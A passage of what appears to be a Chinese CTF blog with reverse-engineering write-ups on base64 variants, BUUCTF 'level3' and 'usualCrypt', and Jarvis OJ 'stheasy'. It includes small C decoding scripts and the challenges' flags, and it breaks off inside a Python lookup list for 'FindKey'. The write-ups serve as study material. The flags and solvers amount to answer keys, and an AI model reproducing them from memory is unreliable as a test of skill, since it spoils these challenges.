href="https://pan.baidu.com/s/1OekeF05h-IkH_16UZOaXQQ">附件链接</a> 提取码：0000<br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/1.PNG"></p><p>图中的flag为ZmxhZ3t5b3VfZ2V0X2l0fQ==，经base64解码得</p><blockquote><p>flag{you_get_it}</p></blockquote><h3 id="flag为加密结果"><a href="#flag为加密结果" class="headerlink" title="flag为加密结果"></a>flag为加密结果</h3><p><a href="https://pan.baidu.com/s/15KN694_td7Ds7xKnp8ussw">附件链接</a> 提取码：0000<br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/2.PNG"></p><p>图中的str也是ZmxhZ3t5b3VfZ2V0X2l0fQ==，经base64加密得</p><blockquote><p>flag：Wm14aFozdDViM1ZmWjJWMFgybDBmUT09</p></blockquote><h3 id="如何判断是加密还是解密"><a href="#如何判断是加密还是解密" class="headerlink" title="如何判断是加密还是解密"></a>如何判断是加密还是解密</h3><p>我们可以观察一下密码函数</p><blockquote><p>加密<br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/3.PNG"><br>解密<br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/4.PNG"></p></blockquote><p>可以发现，加密函数下有一个padding_char，点进去是一个‘=’，那这就是加密函数。<br>或者有‘&amp; 3’‘&amp; 0xf’‘&amp; 0x3f’‘= 61’,也是加密函数。<br>遇到此类题目时，大多数加密的。懒得分析也可以都试试，这也就是一会儿的时间。<br>最后的那个判断还可以和异或联系，注意一下就行，这里便不再举例，<br>下面的类型我只说加密，加密和解密的思路都是一样的。</p><h2 id="2-变化字母表"><a href="#2-变化字母表" class="headerlink" title="2.变化字母表"></a>2.变化字母表</h2><p>将base64原来的字母表改变顺序、位置得到新的加密结果。<br>有两种变化方式：1.直接改变；2.用函数改变</p><h3 id="直接改变"><a href="#直接改变" class="headerlink" title="直接改变"></a>直接改变</h3><p><a href="https://pan.baidu.com/s/1mE75zgqcVl2guLosEEiNwQ">附件链接</a> 提取码：0000<br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/5.PNG"></p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/6.PNG"></p><p>这一题的字母表改为了’0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/‘，根据这个字母表和原版字母表的差别，将密文修改为正确的密文。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char a[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char b[]&#x3D;&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+&#x2F;&quot;;</span><br><span class="line">    char c[]&#x3D;&quot;pCNxpTJkq6AAnSAAnSpIg6tZ&quot;;</span><br><span class="line">    int i,j;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;strlen(a);j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(b[j]&#x3D;&#x3D;c[i])</span><br><span class="line">            &#123;</span><br><span class="line">                c[i]&#x3D;a[j];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Thi$_i$_fl@g&#125;</span><br></pre></td></tr></table></figure><h3 id="用函数改变"><a href="#用函数改变" class="headerlink" title="用函数改变"></a>用函数改变</h3><p><a href="https://pan.baidu.com/s/1VpBPqjboo7Wm5yQCXZO1JA">附件链接</a> 提取码：0000<br>这个是调用一个外部函数改变密码表的顺序。</p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/7.PNG"></p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/8.PNG"></p><p>这种方式比直接改变复杂了一点点。但也不难。<br>这里用了两次waaaagh函数，另一次再base64_encode里，没有显示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char a[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char b[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">    char c[]&#x3D;&quot;tSdNt3ZouGQQr2QQr2tYkGx9&quot;;</span><br><span class="line">    int i,j;</span><br><span class="line">    int n&#x3D;10;</span><br><span class="line">char ch;</span><br><span class="line">while(n&lt;40)</span><br><span class="line">&#123;</span><br><span class="line">ch&#x3D;b[n];</span><br><span class="line">b[n]&#x3D;b[n+10];</span><br><span class="line">b[n+10]&#x3D;ch;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">n&#x3D;10;</span><br><span class="line">while(n&lt;40)</span><br><span class="line">&#123;</span><br><span class="line">ch&#x3D;b[n];</span><br><span class="line">b[n]&#x3D;b[n+10];</span><br><span class="line">b[n+10]&#x3D;ch;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;strlen(a);j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(b[j]&#x3D;&#x3D;c[i])</span><br><span class="line">            &#123;</span><br><span class="line">                c[i]&#x3D;a[j];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Thi$_i$_fl@g&#125;</span><br></pre></td></tr></table></figure><h1 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h1><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><a href="https://buuoj.cn/challenges#[WUSTCTF2020]level3">题目链接</a><br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/9.PNG"></p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/10.PNG"></p><p>和上面的那题差不多。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int i,j,v0,result;</span><br><span class="line">char ch[]&#x3D;&quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD&#x3D;&#x3D;&quot;;</span><br><span class="line">char base64_table[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">char base64_table1[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line"> for ( i &#x3D; 0; i &lt;&#x3D; 9; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">    v0 &#x3D; base64_table[i];</span><br><span class="line">    base64_table[i] &#x3D; base64_table[19 - i];</span><br><span class="line">    result &#x3D; 19 - i;</span><br><span class="line">    base64_table[result] &#x3D; v0;</span><br><span class="line">    &#125;</span><br><span class="line">for(i&#x3D;0;i&lt;strlen(ch);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;strlen(base64_table1);j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(base64_table[j]&#x3D;&#x3D;ch[i])</span><br><span class="line">            &#123;</span><br><span class="line">                ch[i]&#x3D;base64_table1[j];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(ch);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,ch[i]);</span><br><span class="line">    &#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{Base64_is_the_start_of_reverse}</p></blockquote><h2 id="usualCrypt"><a href="#usualCrypt" class="headerlink" title="usualCrypt"></a>usualCrypt</h2><p><a href="https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]usualCrypt">题目链接</a><br><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/11.PNG"></p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/12.PNG"></p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/13.PNG"></p><p><img src="/2021/03/20/base64%E5%9C%A8%E9%80%86%E5%90%91%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/14.PNG"></p><p>这一题除了字母表的变化，还将密文的字母大小写交换了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char a[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char b[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">    char c[]&#x3D;&quot;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&quot;;</span><br><span class="line">    int i,j,v1;</span><br><span class="line">    int result &#x3D; 6;</span><br><span class="line">    for (i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">    if ( c[i] &gt;&#x3D; &#39;a&#39; &amp;&amp; c[i] &lt;&#x3D; &#39;z&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">        c[i] -&#x3D; 32;</span><br><span class="line">    &#125;</span><br><span class="line">      else if ( c[i] &gt;&#x3D; &#39;A&#39; &amp;&amp; c[i] &lt;&#x3D; &#39;Z&#39; )</span><br><span class="line">      &#123;</span><br><span class="line">        c[i] +&#x3D; 32;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">      c[i] &#x3D; c[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v1 &#x3D; b[result+10];</span><br><span class="line">    b[result+10] &#x3D; b[result];</span><br><span class="line">    b[result++] &#x3D; v1;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( result &lt; 15 );</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;strlen(a);j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(b[j]&#x3D;&#x3D;c[i])</span><br><span class="line">            &#123;</span><br><span class="line">                c[i]&#x3D;a[j];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{bAse64_h2s_a_Surprise}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jarvis OJ</title>
      <link href="/2021/03/03/Jarvis-OJ/"/>
      <url>/2021/03/03/Jarvis-OJ/</url>
      
        <content type="html"><![CDATA[<h1 id="stheasy"><a href="#stheasy" class="headerlink" title="stheasy"></a>stheasy</h1><a id="more"></a><p><a href="https://pan.baidu.com/s/1Ev7oxqScoIAP5-pb_ZKxdw">附件链接</a> 提取码：0000<br>放入ida32中，进入main函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+10h] [ebp-110h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input flag:&quot;</span>);</span><br><span class="line">  sub_80485A0(&amp;s, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( sub_8048630(&amp;s) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Flag is right.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Flag is wrong.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看sub_8048630</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_8048630</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( s )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 == <span class="number">29</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ( s[v3] == stru_8049AE0[(stru_8049B15[v3] / <span class="number">3u</span> - <span class="number">2</span>)] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( ++v3 == <span class="number">29</span> )</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要返回值为1，判断相等就行了。<br>脚本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">29</span>]=&#123;<span class="number">0x48</span>,<span class="number">0x5D</span>,<span class="number">0x8D</span>,<span class="number">0x24</span>,<span class="number">0x84</span>,<span class="number">0x27</span>,<span class="number">0x99</span>,<span class="number">0x9F</span>,<span class="number">0x54</span>,<span class="number">0x18</span>,<span class="number">0x1E</span>,</span><br><span class="line"><span class="number">0x69</span>,<span class="number">0x7E</span>,<span class="number">0x33</span>,<span class="number">0x15</span>,<span class="number">0x72</span>,<span class="number">0x8D</span>,<span class="number">0x33</span>,<span class="number">0x24</span>,<span class="number">0x63</span>,<span class="number">0x21</span>,<span class="number">0x54</span>,<span class="number">0x0C</span>,<span class="number">0x78</span>,</span><br><span class="line"><span class="number">0x78</span>,<span class="number">0x78</span>,<span class="number">0x78</span>,<span class="number">0x78</span>,<span class="number">0x1B</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> b[]=<span class="string">&quot;lk2j9Gh&#125;AgfY4ds-a6QW1#k5ER_T[cvLbV7nOm3ZeX&#123;CMt8SZo]U&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> flag[<span class="number">29</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">29</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    flag[i]=b[(a[i]/<span class="number">3</span><span class="number">-2</span>)];</span><br><span class="line">    <span class="keyword">if</span>(flag[i]&lt;<span class="number">0</span>)</span><br><span class="line">        flag[i]+=<span class="number">128</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>kctf{YoU_hAVe-GOt-fLg_233333}</p></blockquote><h1 id="FindKey"><a href="#FindKey" class="headerlink" title="FindKey"></a>FindKey</h1><p><a href="https://pan.baidu.com/s/1p4533RDCl_ba51tAAZGe0g">附件链接</a> 提取码：0000<br>这是一个pyc文件，将后缀改为pyc即可反编译。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">lookup = [<span class="number">196</span>,<span class="number">153</span>, <span class="number">149</span>,<span class="number">206</span>, <span class="number">17</span>,<span class="number">221</span>, <span class="number">10</span>, <span class="number">217</span>, <span class="number">167</span>, <span class="number">18</span>, <span class="number">36</span>, <span class="number">135</span>, <span class="number">103</span>, <span class="number">61</span>, <span class="number">111</span>, <span class="number">31</span>, <span class="number">92</span>, <span class="number">152</span>, </span><br><span class="line"><span class="number">21</span>, <span class="number">228</span>, <span class="number">105</span>, <span class="number">191</span>, <span class="number">173</span>, <span class="number">41</span>, <span class="number">2</span>, <span class="number">245</span>, <span class="number">23</span>, <span class="number">144</span>, <span class="number">1</span>, <span class="number">246</span>, <span class="number">89</span>, <span class="number">178</span>, <span class="number">182</span>, <span class="number">119</span>, <span class="number">38</span>, <span class="number">85</span>, <span class="number">48</span>, <span class="number">226</span>, </span><br><span class="line"><span class="number">165</span>, <span class="number">241</span>, <span class="number">166</span>, <span class="number">214</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">151</span>, <span class="number">3</span>, <span class="number">109</span>, <span class="number">169</span>, <span class="number">150</span>, <span class="number">224</span>, <span class="number">69</span>, <span class="number">156</span>, <span class="number">158</span>, <span class="number">57</span>, <span class="number">181</span>, <span class="number">29</span>, <span class="number">200</span>, <span class="number">37</span>, </span><br><span class="line"><span class="number">51</span>, <span class="number">252</span>, <span class="number">227</span>, <span class="number">93</span>, <span class="number">65</span>, <span class="number">82</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">170</span>, <span class="number">77</span>, <span class="number">49</span>, <span class="number">177</span>, <span class="number">81</span>, <span class="number">94</span>, <span class="number">202</span>, <span class="number">107</span>, <span class="number">25</span>, <span class="number">73</span>, <span class="number">148</span>, <span class="number">98</span>, <span class="number">129</span>, </span><br><span class="line"><span class="number">231</span>, <span class="number">212</span>, <span class="number">14</span>, <span class="number">84</span>, <span class="number">121</span>, <span class="number">174</span>, <span class="number">171</span>, <span class="number">64</span>, <span class="number">180</span>, <span class="number">233</span>, <span class="number">74</span>, <span class="number">140</span>, <span class="number">242</span>, <span class="number">75</span>, <span class="number">104</span>, <span class="number">253</span>, <span class="number">44</span>, <span class="number">39</span>, <span class="number">87</span>, <span class="number">86</span>, </span><br><span class="line"><span class="number">27</span>, <span class="number">68</span>, <span class="number">22</span>, <span class="number">55</span>, <span class="number">76</span>, <span class="number">35</span>, <span class="number">248</span>, <span class="number">96</span>, <span class="number">5</span>, <span class="number">56</span>, <span class="number">20</span>, <span class="number">161</span>, <span class="number">213</span>, <span class="number">238</span>, <span class="number">220</span>, <span class="number">72</span>, <span class="number">100</span>, <span class="number">247</span>, <span class="number">8</span>, <span class="number">63</span>, <span class="number">249</span>, </span><br><span class="line"><span class="number">145</span>, <span class="number">243</span>, <span class="number">155</span>, <span class="number">222</span>, <span class="number">122</span>, <span class="number">32</span>, <span class="number">43</span>, <span class="number">186</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">216</span>, <span class="number">126</span>, <span class="number">15</span>, <span class="number">42</span>, <span class="number">115</span>, <span class="number">138</span>, <span class="number">240</span>, <span class="number">147</span>, <span class="number">229</span>, </span><br><span class="line"><span class="number">204</span>, <span class="number">117</span>, <span class="number">223</span>, <span class="number">141</span>, <span class="number">159</span>, <span class="number">131</span>, <span class="number">232</span>, <span class="number">124</span>, <span class="number">254</span>, <span class="number">60</span>, <span class="number">116</span>, <span class="number">46</span>, <span class="number">113</span>, <span class="number">79</span>, <span class="number">16</span>, <span class="number">128</span>, <span class="number">6</span>, <span class="number">251</span>, <span class="number">40</span>, </span><br><span class="line"><span class="number">205</span>, <span class="number">137</span>, <span class="number">199</span>, <span class="number">83</span>, <span class="number">54</span>, <span class="number">188</span>, <span class="number">19</span>, <span class="number">184</span>, <span class="number">201</span>, <span class="number">110</span>, <span class="number">255</span>, <span class="number">26</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">132</span>, <span class="number">160</span>, <span class="number">168</span>, <span class="number">154</span>, <span class="number">185</span>, </span><br><span class="line"><span class="number">183</span>, <span class="number">244</span>, <span class="number">78</span>, <span class="number">33</span>, <span class="number">123</span>, <span class="number">28</span>, <span class="number">59</span>, <span class="number">12</span>, <span class="number">210</span>, <span class="number">218</span>, <span class="number">47</span>, <span class="number">163</span>, <span class="number">215</span>, <span class="number">209</span>, <span class="number">108</span>, <span class="number">235</span>, <span class="number">237</span>, <span class="number">118</span>, <span class="number">101</span>, </span><br><span class="line"><span class="number">24</span>, <span class="number">234</span>, <span class="number">106</span>, <span class="number">143</span>, <span class="number">88</span>, <span class="number">9</span>, <span class="number">136</span>, <span class="number">95</span>, <span class="number">30</span>, <span class="number">193</span>, <span class="number">176</span>, <span class="number">225</span>, <span class="number">198</span>, <span class="number">197</span>, <span class="number">194</span>, <span class="number">239</span>, <span class="number">134</span>, <span class="number">162</span>, <span class="number">192</span>, </span><br><span class="line"><span class="number">11</span>, <span class="number">70</span>, <span class="number">58</span>, <span class="number">187</span>, <span class="number">50</span>, <span class="number">67</span>, <span class="number">236</span>, <span class="number">230</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">190</span>, <span class="number">208</span>, <span class="number">207</span>, <span class="number">7</span>, <span class="number">53</span>, <span class="number">219</span>, <span class="number">203</span>, <span class="number">62</span>, <span class="number">114</span>, <span class="number">127</span>, </span><br><span class="line"><span class="number">125</span>, <span class="number">164</span>, <span class="number">179</span>, 